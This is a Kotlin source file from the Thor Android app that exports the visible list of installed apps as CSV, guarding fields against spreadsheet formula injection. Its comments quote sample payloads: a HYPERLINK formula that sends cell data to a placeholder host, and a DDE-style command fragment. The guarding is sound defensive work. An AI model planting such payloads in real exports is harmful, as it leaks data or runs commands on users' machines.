// SPDX-FileCopyrightText: 2025-2026 Trinadh Thatakula <github.com/trinadhthatakula/Thor>
// SPDX-License-Identifier: GPL-3.0-or-later

package com.valhalla.thor.domain.model

import java.time.Instant
import java.time.ZoneId
import java.time.format.DateTimeFormatter

/** MIME type for the exported list; what the SAF/MediaStore write is labelled with. */
const val APP_LIST_MIME = "text/csv"

private const val FILE_NAME_PREFIX = "thor-apps-"
private const val FILE_NAME_SUFFIX = ".csv"

// Local time for the same reason `BackupIndex` uses it: the only consumer of the *name* is a person
// sorting a folder. Field order is sortable, so a lexical sort of the folder is chronological.
private val fileStamp: DateTimeFormatter =
    DateTimeFormatter.ofPattern("yyyyMMdd-HHmmss").withZone(ZoneId.systemDefault())

/**
 * The characters a spreadsheet treats as the start of a formula rather than as text.
 *
 * TAB and CR are here because Excel strips leading whitespace before deciding, so `\t=cmd|...` is a
 * formula to it and a harmless string to a naive check.
 */
private val FORMULA_STARTERS = charArrayOf('=', '+', '-', '@', '\t', '\r')

/** One export, named for the moment it was written. */
fun appListFileName(createdAt: Long): String =
    FILE_NAME_PREFIX + fileStamp.format(Instant.ofEpochMilli(createdAt)) + FILE_NAME_SUFFIX

/**
 * RFC 4180 quoting, plus a leading apostrophe on anything a spreadsheet would evaluate.
 *
 * App labels are third-party-controlled — an app declares its own — and the people who export a
 * list of installed apps from a debloater are precisely the people who install APKs from places
 * that do not vet them. An app named `=HYPERLINK("http://x/"&A1,"Update")` becomes a live formula
 * the moment the file is double-clicked.
 *
 * The apostrophe is visible in the cell, which is the trade: the corruption it introduces is rare
 * and obvious, and the failure it prevents is neither.
 */
internal fun csvField(value: String?): String {
    val raw = value.orEmpty()
    val guarded = if (raw.isNotEmpty() && raw[0] in FORMULA_STARTERS) "'$raw" else raw
    return if (guarded.any { it == ',' || it == '"' || it == '\n' || it == '\r' }) {
        "\"" + guarded.replace("\"", "\"\"") + "\""
    } else {
        guarded
    }
}

/**
 * The visible app list as CSV, in the order it is on screen.
 *
 * Exactly what the user is looking at — the tab, the search, the filter and the sort are all
 * already applied by the time the list gets here. A user who wants everything runs it twice, which
 * is why `is_system` is a column even though one export only ever holds one kind.
 *
 * No install size. It is the difference between a write that finishes before the sheet closes and
 * one that needs a progress bar and a cancel button, because the size of an app is a
 * `StorageStatsManager` round trip per package.
 */
fun appListCsv(apps: List<AppInfo>): String = buildString {
    append("app_name,package_name,version_name,version_code,installer,is_system,enabled,suspended")
    append('\n')
    apps.forEach { app ->
        append(csvField(app.appName ?: app.packageName)).append(',')
        append(csvField(app.packageName)).append(',')
        append(csvField(app.versionName)).append(',')
        append(app.versionCode).append(',')
        // Blank rather than "Unknown": a reader can tell an empty cell from a store that happens to
        // be called that, and the placeholder is Thor's word, not Android's.
        append(csvField(app.installerPackageName?.takeUnless { it == Installers.UNKNOWN })).append(',')
        append(app.isSystem).append(',')
        append(app.enabled).append(',')
        append(app.isSuspended)
        append('\n')
    }
}
